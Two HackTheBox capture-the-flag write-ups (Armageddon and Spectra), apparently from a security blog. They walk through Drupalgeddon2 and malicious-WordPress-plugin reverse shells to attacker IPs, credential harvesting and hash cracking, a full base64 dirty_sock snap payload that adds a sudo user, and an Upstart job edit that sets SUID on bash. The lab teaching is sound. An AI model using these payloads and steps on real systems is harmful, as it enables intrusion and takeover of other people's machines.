We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box. From there, the database credentials used by Drupal are discovered, letting us connect to the mysql database and get another user’s credentials. We later discover this user can install snap packages with sudo. Exploiting this, we create a new user on the system by installing a custom .snap file. The new user has the permission to run everything with sudo, giving us the ability to change to the root user.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning the default ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  nmap -sC -sV 10.10.10.233 -oA armageddon Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 04:49 EDT Nmap scan report for 10.10.10.233 Host is up (0.089s latency).

Port 80 From our initial nmap scan we can see that an HTTP server is running on port 80. By visiting the page we see the following:\nBy using the Wappalyzer addon for firefox (which we can get here: https://addons.mozilla.org/el/firefox/addon/wappalyzer/) we can see right away, that the server is using Drupal version 7, which is a free and open-source Content Management System (CMS). In case we did not have the wappalyzer addon we could still identify that this is a Drupal installation from the page source:\nAt this point, we could try some default credentials or try brute forcing our way in (of course this could potentially lock out a user or/and blacklist our IP so always use with caution). We could also create a new user and try to log in. Since these paths did not appear to work, the next step is to search about Drupal version 7, in order to possibly identify any vulnerability/exploit. Simply searching for “Drupal 7 exploit” returns a lot of results. The very first interesting result appears to be the known Drupalgeddon2 exploit (https://github.com/dreadlocked/Drupalgeddon2). If we ignore the fact that the box’s name is Armageddon (kinda sounds like Drupalgeddon) which pushes us to believe that it is the right exploit, we would try this exploit anyway since it seems to affect the following versions:\n Drupal \u003c 8.3.9 / \u003c 8.4.6 / \u003c 8.5.1 Drupal \u003c 7.58  which includes our version.\n Getting a shell as apache The exploit we found out is already included in the Metasploit Framework and we are gonna use it from there. Searching for “Drupal” we can find it pretty easily:\nThe process of the exploitation is pretty straightforward at this point. After selecting the correct exploit from our search we are going to:\n set rhosts 10.10.10.233: Declare our target. set lhost tun0: Set our tun0 interface in order for the reverse shell to connect to the right IP. run: run the exploit  We now have a meterpreter shell as the apache user.\n Escalating privileges to the user brucetherealadmin Since we got a shell as apache, which is a not very privileged user, we will need to escalate our privileges to a normal user. Simply using ls -la we can see that we can read the server files, including the Drupal installation files:\nIt should be mentioned here that in order for Drupal to work, you have to tell Drupal where it will find the database, what the name of the database is, and what are the database credentials in order to access it. All these information are stored in a file called settings.php. Since we can read the Drupal installation files as the apache user, we can also read this file. Even if we do not know the exact location of this file, a simple Google search for “drupal credentials file” can do the job (https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored). From this Drupal forum we can see that the file we want is located at /sites/default/settings.php, which we of cource have access to. Reading the file we can start searching for the database credentials stored inside it:\nWe now have a set of credentials for the mysql database. We can also verify that the target does indeed listen to the mysql port:\nThis means we can log in mysql to possibly find more credentials. Since we already know from the file that we have the database’s name is drupal we are going to run the following in order to see the tables in it (password reducted):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  mysql -u drupaluser -*************** -D drupal -e 'show tables;' Tables_in_drupal actions authmap batch block block_custom block_node_type block_role blocked_ips cache cache_block cache_bootstrap cache_field cache_filter cache_form cache_image cache_menu cache_page cache_path comment date_format_locale date_format_type date_formats field_config field_config_instance field_data_body field_data_comment_body field_data_field_image field_data_field_tags field_revision_body field_revision_comment_body field_revision_field_image field_revision_field_tags file_managed file_usage filter filter_format flood history image_effects image_styles menu_custom menu_links menu_router node node_access node_comment_statistics node_revision node_type queue rdf_mapping registry registry_file role role_permission search_dataset search_index search_node_links search_total semaphore sequences sessions shortcut_set shortcut_set_users system taxonomy_index taxonomy_term_data taxonomy_term_hierarchy taxonomy_vocabulary url_alias users users_roles variable watchdog   Arguments Used:  -u: The user we are going to log in as. This is followed by a - and the password. -D: The database we are going to use. -e: Execute the statement and quit.  From all these tables, the users table is the most promising one (very common table to contain user credentials) so we are going to read it’s contents by using the following command (password reducted):\n1  mysql -u drupaluser -*************** -D drupal -e 'select * from users;'   Since the output is a little crowded, we can select only the columns that mater for each user (password reducted):\n1  mysql -u drupaluser -*************** -D drupal -e 'select name,pass from users;'   As a side note, the user Doomdesire is a user that we previously attempted to create on the initial login page. From here we get the username brucetherealadmin as well as a hash, that we are of course going to crack. To crack the hash we are going to use JohnTheRipper:\n1  john hash --wordlist=/usr/share/wordlists/rockyou.txt   Since we have now cracked the hash, we have a valid pair of credentials and log in as the user brucetherealadmin via ssh:\nWe have now logged in as the user brucetherealadmin.\n Escalating Privileges to root As with many other boxes, the very first thing to check, is if the user can run anything with sudo:\nIt seems we can run /usr/bin/snap install * with root privileges. Reading from the Snap page, “Snaps are cross-distribution, dependency-free, and easy to install applications packaged with all their dependencies to run on all major Linux distributions. As the current user it appears we can install .snap files.\nSearching for any vulnerability online, we get across this exploit https://github.com/initstring/dirty_sock. The exploit is going to allow us to install .snap file to the system, which when installed, is going to add a new user with sudo privileges to the system. The problem that emerged here is that this exploit requires python3 which we do not have on the target system. Reading the exploit “dirty_sockv2.py” from the github page we see that it includes a base64 encoded string:\nwith the following description: The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.\nFrom the above we can conclude that this is the .snap file we want. If we can install it we will have our new user created on the box. In order to create the snap file we are going to use python2 (there are other ways to create it). We are going to use the python print funcion in order to print the base64 string and then this output is going to be piped to the base64 decoder and and then right into a .snap file. Something to point out here is that we are going to have to replace the single quotes of the github base64 string with double quotes. This is required because the single quote is going to be used for the python2 -c argument:\n1  python2 -c 'print \"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\" + \"A\" * 4256 + \"==\"' | base64 -d \u003e Doomdesire.snap   We now have our .snap file:\nWe can also read the file in order to get a general idea of how it is going to work:\nWe can see that it is indeed going to add a new user called dirty_sock and add him to the sudoers group with the permissions to run every command with sudo.\nThe last step to exploit this, is to install our newly created .snap file:\n1  sudo /usr/bin/snap install --devmode Doomdesire.snap   A very important thing to note here, is that the --devmode is required for this to work. As we can read from the article describing this vulnerability that is linked on the end of this writeup, snaps themselves run in sandboxes and require digital signatures matching public keys that machines already trust. However, it is possible to lower these restrictions by indicating that a snap is in development (called “devmode”). This will give the snap access to the host Operating System just as any other application would have. Now that we installed our snap, the exploit has completed and we have a new user on the box. The user’s credentials are the following:\n Username: dirty_sock Password: dirty_sock  Since the user can run anything with sudo, we simply changed to the root user with sudo su\nUseful Resources:  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html: Dirty_Sock Explained. https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/: Drupalgeddon2 Explained. https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory: Info about the settings.php file of Drupal.

We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning the default ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  nmap -sC -sV 10.10.10.229 -oN spectra.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 15:16 EDT Nmap scan report for 10.10.10.229 Host is up (0.081s latency).

Web Server From the nmap scan we can see that an HTTP server is hosted on port 80. HTTP servers are generally the right path to start enumerating so we visit the page: The server appears to be used for issue tracking. By clicking around the page we see the following: This means the server tries to reach spectra.htb, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map spectra.htb to 10.10.10.229 which is our target’s IP. We can do that with nano /etc/hosts: First Link (Wordpress Site) By saving the hosts file, we can now navigate the pages. By clicking on the Software Issue Tracker link now correctly redirects us to the following page: Some instant information we can gather is that this is a Wordpress site and that administrator is a username we can later user in case we want to get access to it. By clicking on the Log in link (bottom right), we get to the Wordpress login page: There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username doomdesire and a random password i get the following error: However, trying to login as administrator and a random password i get the following error: which is clearly a different message from the previous one, confirming that administrator is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not. At this point there were some things we could try in order to maybe login such as:\n Since this is a wordpress site, it’s a very good idea to run wpscan which is a wordpress enumeration tool found here: https://github.com/wpscanteam/wpscan Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution). We could use CeWL (https://github.com/digininja/CeWL) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).  These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.\n Second Link (Test) Apart from the Software Issue Tracker link, there was also a Test link on the initial page, that redirects us to http://spectra.htb/testing/index.php that returns us an Error establishing a database connection message. However, index.php is not the only file hosted on /testing, something that can be easily confirmed by visiting http://spectra.htb/testing/ : There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words “config” and “login” should be the first to read. Checking the wp-config.php.save file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments: including MySQL credentials! Note that Instead of viewing the page source we could also use curl http://spectra.htb/testing/wp-config.php.save from our terminal and we would also be able to view it.\n Accessing the Wordpress Administrator Panel We now have a password and including the newly found username devtest we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the devstest username brings no results, however, trying with the administrator username get’s us right in: Some instant information we can get is that Wordpress is out-of-date and that our version is 5.4.2. Of course we could have known this right from the start by looking for example at the page source of the login page: or by using the firefox extension “Wappalyzer\": The version can also be found by the previously mentioned wpscan tool.\n Getting a shell as nginx Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: https://github.com/wetw0rk/malicious-wordpress-plugin. It’s usage is pretty straightforward. We are gonna run:\n1 2  chmod +x wordpwn.py ./wordpwn.py 10.10.14.9 4444 Y   This will first make the script executable, then create file called “malicious.zip” that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The Y option declares that we want to automatically start a handler with metasploit: As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to Plugins--\u003eAdd New--\u003eUpload Plugin--\u003eBrowse and select the malicious.zip file we generated with the script. We then select Install Now and then Activate Plugin: As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the /main part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):\n http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php  and we get a reverse shell:\n Escalating Privileges to Katie At first glance we can see there is another user on the box named Katie:\n1  cat /etc/passwd | grep \"/bin/bash\"   If we want to get the user.txt we have to escalate our privileges to that user. If we are going to avoid automated tools such as LinPeas, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:\n1  find / -name *.conf* 2\u003e /dev/null   This will search for all files on the system that contain the .conf part on their name. However running this will create a lot of noise from some folders such as /etc, /mnt and /usr so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too. To filter them out we run:\n1  find / -name *.conf* 2\u003e /dev/null | grep -v -e \"/etc/\" -e \"/mnt/\" -e \"/usr\"   We notice a file named /opt/autologin.conf.orig. Reading it, we see there is a password file on a folder named autologin inside /etc. Remember that we filtered out this folder! We could have easily missed it! Reading the passwd file inside /etc/autologin/ we get a password: The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!  Escalating Privileges to root Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as LinPeas, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:\n1  sudo -l   This will list all the binaries Katie can run with sudo: We see that we can run initctl as root. As stated on it’s man page, initctl allows a system administrator to communicate and interact with the Upstart. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:\n Create a new job by writing a new configuration file (.conf). Edit an already existing one.  The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can’t edit all files, however we have the rights to edit some of the files in there. Great! Below we can see what a job configuration file looks like: Notice the part between “script” and “end script”. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let’s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the test.conf file with nano: Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute sudo +s /bin/bash as the root user. We can confirm it worked by executing /bin/bash with the -p flag. The -p flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job: We are root!\nResources A good place to learn about Upstart and initctl: https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it\n","description":"","tags":null,"title":"Spectra Writeup (HackTheBox)","uri":"/posts/writeups/spectra/"}]
